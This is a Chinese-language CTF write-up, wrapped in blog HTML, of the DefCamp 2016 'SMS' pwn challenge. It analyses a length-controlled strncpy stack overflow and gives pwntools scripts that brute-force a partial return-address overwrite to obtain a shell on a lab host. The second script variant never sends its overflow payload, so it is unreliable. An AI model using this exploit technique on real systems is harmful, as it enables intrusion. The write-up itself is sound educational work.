@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>DefCamp CTF Finals 2016 pwn SMS | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="（ps：pie入门题目）
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA
+提取码：4olb
+搭建环境：
+
+1.查看文件保护机制
+
+
+
+
+ubuntu运行ida*64远程调试文件，id..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">DefCamp CTF Finals 2016 pwn SMS</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>（ps：pie入门题目）<br>
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb<br>
+搭建环境：<br>
+<img src="https://closefrom.github.io/post-images/1615577083737.png" alt="" loading="lazy"></p>
+<p>1.查看文件保护机制<br>
+<img src="https://closefrom.github.io/post-images/1615577099085.png" alt="" loading="lazy"></p>
+<ol start="2">
+<li></li>
+</ol>
+<p>ubuntu运行ida*64远程调试文件，ida打开程序<br>
+<img src="https://closefrom.github.io/post-images/1615577113421.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1615577125298.png" alt="" loading="lazy"></figure>
+<p>进入程序后在函数窗口可以看到frontdoor函数，进入看看<br>
+<img src="https://closefrom.github.io/post-images/1615577142708.png" alt="" loading="lazy"><br>
+可以看到是用fget函数读入数据，然后调用system函数运行这些数据，看看给出的伪代码<br>
+<img src="https://closefrom.github.io/post-images/1615577159479.png" alt="" loading="lazy"></p>
+<ol start="3">
+<li></li>
+</ol>
+<p>看回main函数<br>
+<img src="https://closefrom.github.io/post-images/1615577174341.png" alt="" loading="lazy"><br>
+除了puts函数就是dosms函数，跟进到sms函数<br>
+<img src="https://closefrom.github.io/post-images/1615577188442.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615577198356.png" alt="" loading="lazy"><br>
+显然用memset函数初始化数据，然后先后调用了set_user和set_sms函数，并且传入了一个位于ebp-C0h的位置且属于dosms函数的局部变量记为v1。</p>
+<ol start="4">
+<li></li>
+</ol>
+<p>跟进set_user函数（看伪代码吧）<br>
+<img src="https://closefrom.github.io/post-images/1615577215677.png" alt="" loading="lazy"><br>
+开始memset初始化s字符数组，然后puts，printf输出，再就是fgets向s指向的位置(rbp-90h)写入数据。之后，读入了数据的s字符数组，通过一个for循环向传入的a1变量（即dosms的局部变量v1）的a1+（0~40）+ 140处逐个字节赋值</p>
+<ol start="5">
+<li></li>
+</ol>
+<p>跟进set_sms函数（伪代码）<br>
+<img src="https://closefrom.github.io/post-images/1615577239377.png" alt="" loading="lazy"></p>
+<p>重要的地方在于，fgets向s处读入数据，然后通过strncpy函数，将读入的s的  （a1+180） 长度，复制到a1(即dosms函数的局部变量所指位置)。</p>
+<p>a1+180处 要被当做数值来执行strncpy，只要a1+180处数值足够大就可以造成栈溢出。</p>
+<p>根据上面分析的set_user函数可以知道，a1+180处的数据刚刚好是可以改写的。</p>
+<p>a1+180处改写后，通过向set_sms函数的局部变量s（rbp-400h）写入数据，即可通过strncpy函数的赋值字符，进行劫持eip最后两个字节。(a1(即dosms函数的v1变量)在栈中的位置是ebp-c0h，所以要溢出劫持eip的两个字节，至少需要0xc0+0x8+0x2=0xca)<br>
+<img src="https://closefrom.github.io/post-images/1615577338458.png" alt="" loading="lazy"><br>
+（程序的地址的最后三位16进制是不变的）现在只需要将eip劫持到这位置就好，然而strncpy是按字节赋值的，0x?900才够16位即2字节。所以随便改个0x9900开始爆破就可以了</p>
+<p>6.编写exp</p>
+<pre><code>
+from pwn import *
+
+context.binary = './SMS'
+
+while True:
+    link =  remote("192.168.93.137","6666",timeout=1)
+    payload1 = 'A' * 40 + '\xca'
+    link.sendlineafter(">",payload1)
+    payload2 = 'A' * (0xca - 0x2) + '\x01\x99'
+    link.sendlineafter(">",payload2)
+    try:
+        link.recv(timeout=1)
+    except EOFError:
+        link.close()
+        continue
+    else:
+    #else 可以不需要，上面已有continue限制，到此必然是成功进入frontdoor
+        link.sendline('/bin/sh\x00')
+        link.interactive()
+        break
+</code></pre>
+<p>也可以这么写：</p>
+<pre><code>
+from pwn import *
+
+context.binary = './SMS'
+
+for i in range(256):
+    link = remote("192.168.93.137","6666",timeout=1)
+    payload1 = 'A' * 40 + '\xca'
+    link.sendlineafter(">",payload1)
+    payload2 = 'A' * (0xca - 0x2) + '\x01\x99'
+    try:
+        link.sendline('/bin/sh\x00')
+        link.interactive()
+    except:
+    #最好写成except EOFError:
+        print 'failed'
+    link.close()
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/alictf-2016-pwn-vss-wp/">
+                  <h3 class="post-title">
+                    alictf 2016 pwn vss wp
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
